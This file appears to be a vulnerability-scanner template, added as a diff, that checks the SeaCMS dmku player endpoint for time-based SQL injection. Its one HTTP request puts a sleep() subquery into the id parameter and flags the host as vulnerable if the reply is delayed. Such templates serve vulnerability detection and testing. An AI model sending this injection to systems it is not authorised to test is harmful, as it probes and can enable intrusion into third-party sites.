@@ -1,0 +1,27 @@
+id: SeaCMS_dmku_SQL_injected
+
+info:
+  name: SeaCMS_dmku_SQL_injected
+  author: HK
+  severity: high
+  description: SeaCMS海洋影视管理系统/js/player/dmplayer/dmku/接口存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(5)))v)&type=list HTTP/1.1
+    Host: {{Hostname}}
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 5'
